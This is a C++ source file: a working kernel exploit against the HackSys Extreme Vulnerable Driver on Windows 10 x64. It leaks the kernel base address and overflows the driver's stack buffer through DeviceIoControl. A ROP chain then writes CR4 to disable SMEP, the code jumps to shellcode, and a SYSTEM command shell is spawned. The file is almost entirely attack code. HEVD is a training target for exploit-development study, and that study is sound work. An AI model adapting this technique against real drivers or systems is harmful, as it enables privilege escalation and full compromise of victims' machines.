// HEVD 3.0 Windows 10 x64 Buffer Overflow Exploit (Windows 10 x64 2004)

#include <iostream>
#include <windows.h>
#include <psapi.h>
#include "shellcode.h"

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x222003

LPVOID kernelBase()
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;

    BOOL ntBase = EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    if (!ntBase)
    {
        std::cout << "[-] Unable to get kernel base." << std::endl;
        exit(1);
    }
    
    std::cout << "[+] Kernel base address: 0x" << drivers[0] << std::endl;

    return drivers[0];
}


void spawnShell()
{
    std::cout << "[+] Spawning NT AUTHORITY\\SYSTEM shell..." << std::endl;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));

    CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}

void exploitDriver(LPVOID kerneladdress)
{

    unsigned char payload[62];
    getShellcode(payload);

    unsigned char epilogue[] =
        "\x48\x31\xc0"
        "\x48\x31\xff"
        "\x48\x31\xf6"
        "\x4d\x31\xe4"
        "\x4d\x31\xff"
        "\x48\x83\xc4\x10"
        "\xc3";


    HANDLE DeviceHandle = CreateFileW(TEXT(DEVICE_NAME), (GENERIC_READ | GENERIC_WRITE), 0, NULL, OPEN_EXISTING, 0, NULL);

    if (DeviceHandle == INVALID_HANDLE_VALUE)
    {
        std::cout << "[-] Unable to create file handle." << std::endl;
        exit(1);
    }
    std::cout << "[+] Successfully created file handle : 0x" << DeviceHandle << std::endl;

    std::cout << "[+] Allocating memory for ring0 shellcode payload..." << std::endl;
    LPVOID shellcode = VirtualAlloc(0, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    if (!shellcode)
    {
        std::cout << "[-] Unable to allocate memory." << std::endl;
        exit(1);
    }


    char* p1 = static_cast<char*>(shellcode);
    char* p2 = static_cast<char*>(shellcode) + 61;

    memmove(p1, payload, sizeof(payload));
    memmove(p2, epilogue, sizeof(epilogue));


    std::cout << "[+] Shellcode placed at : 0x" << shellcode << std::endl;


    BYTE InBufferContents[2104] = { 0 };

    INT64 pop_rcx = (INT64)kerneladdress + 0x21f06c; // 0x14021f06c POP RCX ; RET
    INT64 rcx_value = 0x70678;
    INT64 cr4 = (INT64)kerneladdress + 0x38af57; // 0x14038af57: mov cr4, ecx ; ret 

    memset(InBufferContents, '\x90', 2072);
    memcpy(InBufferContents + 2072, (PINT64)&pop_rcx, 0x8);
    memcpy(InBufferContents + 2080, (PINT64)&rcx_value, 0x8);
    memcpy(InBufferContents + 2088, (PINT64)&cr4, 0x8);
    memcpy(InBufferContents + 2096, (PINT64)&shellcode, 0x8);

    DWORD BytesReturned = 0;

    int hacksys = DeviceIoControl(DeviceHandle, IOCTL, InBufferContents, sizeof(InBufferContents), NULL, 0x0, &BytesReturned, NULL);

    if (!hacksys)
    {
        std::cout << "[-] Error communicating with driver!" << std::endl;
        exit(1);
    }
    std::cout << "[+] Got handle to driver." << std::endl;

}

int main()
{
    std::cout << "===HEVD 3.0 Buffer Overflow Exploit===\n" << std::endl;
    
    LPVOID kernel = kernelBase();
    exploitDriver(kernel);
    spawnShell();
    std::cout << "[!] Finished!" << std::endl;
    return 0;
}

